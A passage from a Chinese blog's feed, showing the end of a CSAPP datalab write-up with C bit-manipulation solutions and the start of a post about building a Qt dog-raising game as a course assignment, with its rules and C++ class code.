class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(E&gt;=<span class="hljs-number">31</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">23</span>) frac&gt;&gt;=(<span class="hljs-number">23</span> - E);<br>        <span class="hljs-keyword">else</span> frac&lt;&lt;=(E - <span class="hljs-number">23</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(s==<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> ~frac+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>题目要求：实现 <code>pow(2,x)</code>，返回结果为 <code>unsigned</code> </p><p>因为题目是实现2的阶乘，我们直接在二进制的基础上左移就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsign value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = x + <span class="hljs-number">127</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &gt;= <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>复习题目可以发现很多读书漏掉的重要东西</p><p>第一次做完实验也就浅浅错了三道题 11 个测试罢了🥲</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab_result_1.png"></p><p>最后一道题总是TIMEOUT，看了别的师傅的也是这样干脆改了 <code>btest.c</code> 里的时限</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab%E5%AE%8C%E7%BB%93.png"></p><p>完结撒花撒花~</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPPlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用QT做个养成类小游戏</title>
    <link href="/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <url>/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    
    <content type="html"><![CDATA[<p>记录短学期作业的完成过程</p><span id="more"></span><p>我的队友是ChatGPT，致敬人工智能👩🏼‍💻</p><p>“小狗撑起一个家” 是一款有趣的小狗养成类游戏，让玩家体验养育可爱小狗、打理家庭和参与各种冒险的乐趣。在这个游戏中，玩家将扮演一位爱心满满的主人，收养一只可爱的小狗，并与它一起建立一个幸福的家庭。</p><hr><h3 id="1-工具准备"><a href="#1-工具准备" class="headerlink" title="1.工具准备"></a>1.工具准备</h3><ul><li>可以编译c++程序的编译器，和编写代码的软件。我使用的是VSCode，后期直接用QTCreat写了</li><li>QT Creator和Qt Designer（其实QT Creator一个集合环境就可以全部实现，但是我每次设置新增页面的样式表都会卡死。为了避免卡死丢失数据我选择用Qt Designer单独完成ui界面的设置）</li></ul><h3 id="2-题目"><a href="#2-题目" class="headerlink" title="2.题目"></a>2.题目</h3><p>基于QT开发一款动物世界小游戏</p><p>目的：模拟一个动物家庭。通过设计和编写该程序，锻炼结构化程序设计和面向对象的基本编程技能，提高程序组织的合理性、可读性和可维护性。</p><p>要求：设计一个爱心家庭；功能包括有若干动物家庭成员，模拟成员日常的吃、玩、病、以及购物、工作、做家务等功能。建议采用良好的控制台人机交互界面。 </p><blockquote><p>最后只实现了一个狗狗家庭成员</p></blockquote><p>问题描述：</p><p>（1）  初始时具有基本的生命特征和生存条件。</p><p>（2）  当吃东西后，体重增加，体能增加；</p><p>（3）  当锻炼后，体重下降，体能下降，要求恢复体力；</p><p>（4）  干活后，体能下降，爱心增加，能力增加；</p><p>（5）  打工后，体能下降，经验和金钱上升，爱心增加；</p><p>（6）  没有食品，就处于饥饿状态，报警；</p><p>（7）  买食品，需要付出金钱；</p><p>要求有商店、商店中有多种类商品，工作也有多个种类。</p><h3 id="3-流程"><a href="#3-流程" class="headerlink" title="3.流程"></a>3.流程</h3><h5 id="3-1-正经流程"><a href="#3-1-正经流程" class="headerlink" title="3.1 正经流程"></a>3.1 正经流程</h5><ul><li>游戏开始</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_16-21-26.png"></p><ul><li>游戏流程</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_20-56-38.png"></p><ul><li>家庭属性和成员属性</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_21-39-59.png"></p><h5 id="3-2-游戏规则"><a href="#3-2-游戏规则" class="headerlink" title="3.2 游戏规则"></a>3.2 游戏规则</h5><p>首先开局家庭中有10金币，食物储存为0，爱心数量为5，可选择一位动物家庭成员。</p><p>我爱小狗，所有动物成员都是小狗，可选不同品种，不同品种有不同的特点。</p><p>收养新的家庭成员需要消耗爱心，每一只狗狗消耗五颗爱心，把十只狗狗狗领养回家可以获得一个荣誉。做家务和打工都可以获得爱心。爱心每达到十的倍数就奖励一颗爱心。</p><p>在游戏过程中，购买食物需要消耗金币，动物家庭成员外出打工可以赚金币，金币达到666可获得一个荣誉。</p><p>动物家庭成员刚刚到家时的体力为10（体力满为10），能力为0。打工和做家务都需要消耗体力，进食可以补充体力。体力低于3不能锻炼、打工和做家务，体力低于2即体力为1时会提示，体力为0就会生病。做家务和打工都可以增加能力，只有能力达到5，同时体力大于3才能外出打工。</p><p>大型犬和小型犬每次活动的消耗和回报不一样。</p><h3 id="5-部分代码"><a href="#5-部分代码" class="headerlink" title="5.部分代码"></a>5.部分代码</h3><h4 id="5-1-QT内类的实现"><a href="#5-1-QT内类的实现" class="headerlink" title="5.1 QT内类的实现"></a>5.1 QT内类的实现</h4><p>Dog类示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DOG_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DOG_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QPixmap&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span></span><br><span class="hljs-class">&#123;</span><br>protected:<br>    <span class="hljs-type">int</span> ability;    <span class="hljs-comment">//能力</span><br>    <span class="hljs-type">double</span> energy;   <span class="hljs-comment">//精力</span><br>    QString name;   <span class="hljs-comment">//名字</span><br>    <span class="hljs-type">int</span> ill;     <span class="hljs-comment">//疾病状态</span><br>    <span class="hljs-type">int</span> worktime;  <span class="hljs-comment">//判断工作时长</span><br>    <span class="hljs-type">int</span> state;  <span class="hljs-comment">//判断是否正在忙碌</span><br><br>public:<br><br>    Dog();<br>    virtual ~Dog();<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">DogGrow</span><span class="hljs-params">()</span>;   <span class="hljs-comment">//日常精力消耗</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogName</span><span class="hljs-params">(QString Dogname)</span>;   <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">resetDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span>;<br><br>    QString <span class="hljs-title function_">getDogName</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogAbility</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-title function_">getDogEnergy</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogState</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogWorktime</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">judgeDogIll</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doHousework</span><span class="hljs-params">()</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BigDog</span> :</span> public Dog<br>&#123;<br>public:<br>    BigDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmallDog</span> :</span> public Dog<br>&#123;<br>public:<br>    SmallDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// DOG_H</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dog.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;family.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QInputDialog&gt;</span></span><br><br><br>Dog::<span class="hljs-built_in">Dog</span>()<br>&#123;<br>    ill=<span class="hljs-number">0</span>;<br>    ability=<span class="hljs-number">0</span>;<br>    energy=<span class="hljs-number">10</span>;<br>    state=<span class="hljs-number">0</span>;<br>    worktime=<span class="hljs-number">0</span>;<br>&#125;<br><br>Dog::~<span class="hljs-built_in">Dog</span>() &#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::DogGrow</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(ill==<span class="hljs-number">1</span>||energy&lt;=<span class="hljs-number">0.0</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">//如果小狗生病了，就直接退回不会发生经历的的消耗</span><br><br>    <span class="hljs-keyword">if</span>(state==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(energy<span class="hljs-number">-1</span>&lt;=<span class="hljs-number">0.0</span>)<br>        &#123;<br>            energy=<span class="hljs-number">0.0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            energy--;  <span class="hljs-comment">//日常活动默认精力减一</span><br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        state=<span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogName</span><span class="hljs-params">(QString Dogname)</span></span><br><span class="hljs-function"></span>&#123;<br>    name=Dogname;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy=Dogenergy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span></span><br><span class="hljs-function"></span>&#123;<br>    ability=Dogability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::resetDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=<span class="hljs-number">0</span>;<br>    ill=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span></span><br><span class="hljs-function"></span>&#123;<br>    ill=DogIll;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span></span><br><span class="hljs-function"></span>&#123;<br>    state=Dogstate;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=Worktime;<br>&#125;<br><br><span class="hljs-function">QString <span class="hljs-title">Dog::getDogName</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">Dog::getDogEnergy</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> energy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogAbility</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ill;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogState</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogWorktime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> worktime;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::judgeDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(energy==<span class="hljs-number">0.0</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(worktime==<span class="hljs-number">5</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::doHousework</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;做家务&quot;</span>, <span class="hljs-string">&quot;小狗帮忙家务一小时，快夸夸小狗！\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;做家务&quot;</span>, <span class="hljs-string">&quot;小狗很累，快为小狗补充体力吧！\n&quot;</span>);<br>    &#125;<br>&#125;<br><br>BigDog::<span class="hljs-built_in">BigDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += (food / <span class="hljs-number">2.0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy -= (<span class="hljs-number">1</span> / <span class="hljs-number">2.0</span>);<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;小狗将出门打工一小时，记得奖励小狗哦！\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;小狗很累，快为小狗补充体力吧！\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;经验不足被老板劝退了，去做家务增加经验吧！\n&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br>SmallDog::<span class="hljs-built_in">SmallDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += food;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    QString message=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;小狗将出门打工一小时，记得奖励小狗哦！\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;小狗很累，快为小狗补充体力吧！\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;经验不足被老板劝退了，去做家务增加经验吧！\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-2-部分功能介绍"><a href="#5-2-部分功能介绍" class="headerlink" title="5.2 部分功能介绍"></a>5.2 部分功能介绍</h4><h5 id="读档存档"><a href="#读档存档" class="headerlink" title="读档存档"></a>读档存档</h5><p>利用TXT文件的读写实现存档功能</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 